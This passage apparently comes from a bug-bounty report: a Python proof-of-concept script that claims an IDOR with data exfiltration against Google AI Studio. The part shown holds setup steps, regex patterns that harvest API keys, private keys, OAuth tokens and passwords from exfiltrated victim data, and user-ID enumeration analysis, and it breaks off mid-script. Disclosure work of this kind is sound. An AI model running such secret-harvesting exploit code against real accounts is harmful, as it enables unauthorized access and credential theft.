## Part 4: The Definitive & Unified Proof-of-Concept Toolkit

This single Python script is a complete vulnerability validation tool. It provides undeniable, runnable proof of the entire vulnerability chain, from discovery and logical proof to a multi-stage exploit.

### A. Prerequisites:

*   Python 3.x
*   Required Libraries: `pip install requests pandas matplotlib seaborn numpy` (Note: `pandas`, `matplotlib`, `seaborn`, `numpy` are for the optional `analyze-ids` mode). `requests` is essential for `exploit` mode.
*   Two Test Accounts: An "Attacker Account" and a "Victim Account" on the target platform (AI Studio).
*   `wiz_data.json` file: Created as per the instructions in the script's `--help` message (copy `JSON.stringify(window.WIZ_global_data)` from attacker's session).
*   Victim Data: The victim account should have some unique, identifiable data (e.g., a unique prompt title or content). For the secondary exfiltration part, the victim's data should ideally contain a fake secret pattern the script can find (e.g., "My private key is sk-live-abcdefghijklmnopqrstuvwx").
*   **Local Vulnerable Server (for local testing):** The simulated backend server (`services/api/server.js`) must be running. Navigate to `services/api` directory and run `npm install` then `npm start`.

### B. The Complete, Self-Contained, and Unified PoC Script:

(Save the following code as `Unified-Exploit-Full-Chain.py`)

```python
# =================================================================================================
# VRP SUBMISSION: UNIFIED PROOF-OF-CONCEPT FOR GOOGLE AI STUDIO (MAKERSUITE)
# VULNERABILITY:  Critical IDOR Chained with Data Exfiltration & Scalable ID Enumeration Analysis
# REPORTER:       David Amber “WebDUH LLC” Weatherspoon
# VRP ISSUE:      #423273488
#
# This single script is the ultimate combination of all discussed concepts. It automates
# discovery, provides logical proof steps, demonstrates the primary IDOR, shows a chained
# exfiltration vector, and includes statistical ID analysis.
#
# USAGE: python Unified-Exploit-Full-Chain.py --help (for all options)
# =================================================================================================

import re, json, itertools, argparse, requests, pandas as pd, numpy as np, matplotlib.pyplot as plt, seaborn as sns # type: ignore
from typing import Dict, List, Any, Tuple, Optional

class AnsiColors: G, Y, R, M, C, GR, E, B = '\033[92m', '\033[93m', '\033[91m', '\033[95m', '\033[96m', '\033[90m', '\033[0m', '\033[1m'

#region --- HELPER MIXINS ---

class SecretHunterMixin:
    _PATTERNS: Dict[str, re.Pattern] = {
        "GoogleAPIKey": re.compile(r'AIza[0-9A-Za-z_\-]{35}'),
        "GoogleUserID": re.compile(r'\b\d{21}\b'),
        "InternalEndpoint": re.compile(r'https://[A-Za-z0-9.\-]+clients6\.google\.com[^\s"\'`]*')
    }
    def _redact(self, s: str, label: Optional[str] = None) -> str:
        if label == "GoogleUserID" and len(s) > 12: return f"{s[:8]}...{s[-6:]}"
        return f"{s[:6]}...{s[-4:]}" if len(s) > 10 else s

    def classify_blob_content(self, blob_content_str: str) -> Dict[str, Any]:
        priority_extracted: Dict[str, Any] = {}
        try:
            data = json.loads(blob_content_str)
            if isinstance(data, dict):
                direct_keys_map = {
                    "GoogleAPIKey_Full": "PeqOqb",
                    "GoogleUserID_Full": "S06Grb", 
                    "InternalEndpoint_Full": "CoJqbf",
                    "Email_Full": "oPEP7c"
                }
                for result_key, blob_key in direct_keys_map.items():
                    value = data.get(blob_key)
                    if value and isinstance(value, str): 
                        priority_extracted[result_key] = value
                        label_part = result_key.replace("_Full", "")
                        priority_extracted[result_key.replace("_Full", "_Redacted")] = self._redact(value, label_part)
        except json.JSONDecodeError:
            print(f"{AnsiColors.Y}[WARN] Blob content is not valid JSON. Regex scan will proceed for all fields.{AnsiColors.E}")
        
        raw_regex_matches: Dict[str, List[str]] = {k: [] for k in self._PATTERNS}
        for label, rx in self._PATTERNS.items():
            for m in rx.finditer(blob_content_str):
                full_match = m.group(0)
                if full_match not in raw_regex_matches[label]: 
                    raw_regex_matches[label].append(full_match)
        
        final_results: Dict[str, Any] = dict(priority_extracted) 
        for label in self._PATTERNS.keys():
            full_key_name = f"{label}_Full"
            redacted_key_name = f"{label}_Redacted"
            
            if not final_results.get(full_key_name) and raw_regex_matches.get(label): 
                final_results[full_key_name] = raw_regex_matches[label][0]
                final_results[redacted_key_name] = self._redact(raw_regex_matches[label][0], label)

            if raw_regex_matches.get(label):
                 all_redacted_key_name = f"{label}_All_Redacted"
                 final_results[all_redacted_key_name] = list(dict.fromkeys([self._redact(m, label) for m in raw_regex_matches[label]]))
        
        return {k: v for k, v in final_results.items() if v is not None}


class SecondarySecretExtractorMixin:
    _SECONDARY_SECRET_PATTERNS: Dict[str, re.Pattern] = {
        "GenericAPIKey": re.compile(r'(sk-live-|pk_test_)[0-9a-zA-Z]{20,}'),
        "PrivateKeyBlock": re.compile(r'-----BEGIN ((?:RSA|OPENSSH|PGP) )?PRIVATE KEY-----.*?-----END \1PRIVATE KEY-----', re.DOTALL),
        "OAuthToken": re.compile(r'[A-Za-z0-9_~\-\.\+\/]{20,}\.[A-Za-z0-9_~\-\.\+\/]{20,}\.[A-Za-z0-9_~\-\.\+\/]{20,}'),
        "MockServerSecret": re.compile(r'secret_info_for_[a-zA-Z0-9_]+\b'), # Specific to local server.js data
        "PasswordInText": re.compile(r'(?:password|secret|key)\s*is\s*[:=]?\s*[\'"]?([^\s\'"]+)[\'"]?', re.IGNORECASE)

    }
    def _redact(self, s: str, label: Optional[str] = None) -> str: 
        return f"{s[:10]}...{s[-5:]}" if len(s) > 20 else s 
    
    def extract_secondary_secrets(self, exfiltrated_content: str) -> List[Dict[str,str]]:
        found_secrets: List[Dict[str,str]] = []
        for label, rx in self._SECONDARY_SECRET_PATTERNS.items():
            for m in rx.finditer(exfiltrated_content):
                secret_value = m.group(1) if m.groups() and m.group(1) and label == "PasswordInText" else m.group(0)
                if len(secret_value) > 5 : 
                    found_secrets.append({
                        "type": label,
                        "value": secret_value, 
                        "redacted": self._redact(secret_value, "GenericSecret") 
                    })
        return found_secrets

class IdAnalysisMixin:
    def analyze_user_ids_statistically(self, sample_ids: List[str], plot_enabled: bool = True):
        print(f"\n{AnsiColors.B}--- Appendix A: User-ID Statistical Enumerability Analysis ---{AnsiColors.E}")
        valid_ids = [s for s in sample_ids if s and s.isdigit() and len(s) >= 12] 
        if len(valid_ids) < 2:
            print(f"{AnsiColors.Y}[WARN] Need at least 2 valid numeric User IDs for detailed analysis.{AnsiColors.E}"); return
        
        try:
            df = pd.DataFrame(valid_ids, columns=["UserID"])
            df['Last3Digits'] = df['UserID'].str[-3:].astype(int) 
            df['First4Digits'] = df['UserID'].str[:4].astype(int)
        except Exception as e:
            print(f"{AnsiColors.R}[ERROR] Pandas processing error: {e}{AnsiColors.E}"); return

        print(f"\n[*] Analyzing sample of {len(df)} User IDs:\n{df[['UserID', 'First4Digits', 'Last3Digits']].head().to_string(index=False)}")
        if plot_enabled:
            try:
                plt.figure(figsize=(14, 7)); plt.suptitle("User ID Distribution Analysis (Sample)", weight='bold')
                plt.subplot(1, 2, 1); sns.histplot(df['First4Digits'], bins=min(20, df['First4Digits'].nunique() or 1), kde=True, color='skyblue'); plt.title("Distribution of First 4 Digits"); plt.xlabel("Value"); plt.ylabel("Frequency"); plt.grid(True)
                plt.subplot(1, 2, 2); sns.histplot(df['Last3Digits'], bins=min(20, df['Last3Digits'].nunique() or 1), kde=True, color='salmon'); plt.title("Distribution of Last 3 Digits"); plt.xlabel("Value"); plt.ylabel("Frequency"); plt.grid(True)
                plt.tight_layout(rect=[0, 